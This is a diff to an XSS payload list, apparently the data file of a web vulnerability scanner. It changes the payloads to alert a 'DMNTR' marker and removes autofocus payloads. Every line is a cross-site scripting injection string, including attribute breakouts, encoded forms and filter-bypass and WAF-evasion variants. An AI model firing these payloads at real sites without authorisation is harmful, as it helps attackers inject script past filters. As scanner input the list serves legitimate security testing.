@@ -1,76 +1,106 @@
-# XSS Payloads
-# Each line is a separate payload
+# XSS Payloads with DMNTR marker for reliable detection
 # Lines starting with # are comments
+# NO autofocus/onfocus payloads - they don't trigger reliably
 
-# Basic XSS
-<script>alert(1)</script>
-<script>alert('XSS')</script>
-<script>alert(document.cookie)</script>
+# Basic XSS with marker
+<script>alert('DMNTR')</script>
+<script>alert("DMNTR")</script>
+<script>alert(String.fromCharCode(68,77,78,84,82))</script>
 
 # Image-based XSS
-<img src=x onerror=alert(1)>
-<img src=x onerror=alert('XSS')>
-<img/src/onerror=alert(1)>
+<img src=x onerror=alert('DMNTR')>
+<img src=x onerror="alert('DMNTR')">
+<img/src/onerror=alert('DMNTR')>
+<img src=x onload=alert('DMNTR')>
 
 # SVG-based XSS
-<svg onload=alert(1)>
-<svg/onload=alert(1)>
-<svg><script>alert(1)</script></svg>
+<svg onload=alert('DMNTR')>
+<svg/onload=alert('DMNTR')>
+<svg><script>alert('DMNTR')</script></svg>
+<svg><animate onbegin=alert('DMNTR') attributeName=x dur=1s>
+<svg><set onbegin=alert('DMNTR') attributeName=x to=1>
 
-# Event handlers
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<select onfocus=alert(1) autofocus>
-<textarea onfocus=alert(1) autofocus>
-<marquee onstart=alert(1)>
+# Body/HTML events that trigger immediately
+<body onload=alert('DMNTR')>
+<body onpageshow=alert('DMNTR')>
+
+# Marquee triggers on start
+<marquee onstart=alert('DMNTR')>DMNTR</marquee>
+
+# Video/Audio
+<video src=x onerror=alert('DMNTR')>
+<video><source onerror=alert('DMNTR')>
+<audio src=x onerror=alert('DMNTR')>
+
+# Details/Summary toggle
+<details open ontoggle=alert('DMNTR')><summary>DMNTR</summary></details>
+
+# Object/Embed
+<object data="javascript:alert('DMNTR')">
+<embed src="javascript:alert('DMNTR')">
 
 # JavaScript protocol
-javascript:alert(1)
-javascript:alert('XSS')
-javascript:alert(document.domain)
+javascript:alert('DMNTR')
+javascript:alert('DMNTR')//
+javascript:alert`DMNTR`
 
 # Iframe XSS
-<iframe src=javascript:alert(1)>
-<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert('DMNTR')>
+<iframe srcdoc="<script>alert('DMNTR')</script>">
+<iframe src="data:text/html,<script>alert('DMNTR')</script>">
 
-# HTML5 tags
-<video src=x onerror=alert(1)>
-<audio src=x onerror=alert(1)>
-<details open ontoggle=alert(1)>
+# Template literals
+<script>alert`DMNTR`</script>
+<svg><script>alert`DMNTR`</script>
 
-# Encoded payloads
-%3Cscript%3Ealert(1)%3C/script%3E
-&lt;script&gt;alert(1)&lt;/script&gt;
+# Attribute breaking - closing context
+"><script>alert('DMNTR')</script>
+'><script>alert('DMNTR')</script>
+"><img src=x onerror=alert('DMNTR')>
+'><img src=x onerror=alert('DMNTR')>
+"><svg onload=alert('DMNTR')>
 
-# Double encoding
-%253Cscript%253Ealert(1)%253C/script%253E
+# Event handler in broken attribute
+" onmouseover=alert('DMNTR') x="
+' onmouseover=alert('DMNTR') x='
+" onclick=alert('DMNTR') x="
 
-# Without brackets
-<script>alert`1`</script>
-<svg><script>alert`1`</script>
-
-# Filter bypass
-<scr<script>ipt>alert(1)</scr</script>ipt>
-<<SCRIPT>alert(1)</SCRIPT>
-<ScRiPt>alert(1)</sCrIpT>
-
-# Attribute breaking
-"><script>alert(1)</script>
-'><script>alert(1)</script>
-><script>alert(1)</script>
-" onfocus=alert(1) autofocus="
-' onfocus=alert(1) autofocus='
-
-# Comment breaking
---><script>alert(1)</script><!--
-</title><script>alert(1)</script>
-</style><script>alert(1)</script>
+# Comment/tag breaking
+--><script>alert('DMNTR')</script><!--
+</title><script>alert('DMNTR')</script>
+</style><script>alert('DMNTR')</script>
+</script><script>alert('DMNTR')</script>
+</textarea><script>alert('DMNTR')</script>
 
 # Case variations
-<SCRIPT>alert(1)</SCRIPT>
-<sCrIpT>alert(1)</sCrIpT>
-<IMG SRC=x ONERROR=alert(1)>
+<SCRIPT>alert('DMNTR')</SCRIPT>
+<ScRiPt>alert('DMNTR')</sCrIpT>
+<IMG SRC=x ONERROR=alert('DMNTR')>
 
-# WAF bypass
-<scr\x00ipt>alert(1)</scr\x00ipt>
-<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+# Filter bypass - nested tags
+<scr<script>ipt>alert('DMNTR')</scr</script>ipt>
+<<script>alert('DMNTR')//<</script>
+
+# Encoded payloads
+%3Cscript%3Ealert('DMNTR')%3C/script%3E
+%3Csvg%20onload%3Dalert('DMNTR')%3E
+
+# Double encoding
+%253Cscript%253Ealert('DMNTR')%253C/script%253E
+
+# Unicode variations
+<script>\u0061lert('DMNTR')</script>
+<script>eval(atob('YWxlcnQoJ0RNTlRSJyk='))</script>
+
+# Null byte injection
+<scr\x00ipt>alert('DMNTR')</scr\x00ipt>
+<img src=x onerror=alert('DMNTR')\x00>
+
+# Math/Function constructor
+<img src=x onerror=Function('alert(`DMNTR`)')()>
+<img src=x onerror=[].constructor.constructor('alert(`DMNTR`)')()>
+
+# DOM XSS patterns
+<script>location='javascript:alert("DMNTR")'</script>
+<script>eval('alert("DMNTR")')</script>
+<script>document.write('<img src=x onerror=alert("DMNTR")>')</script>
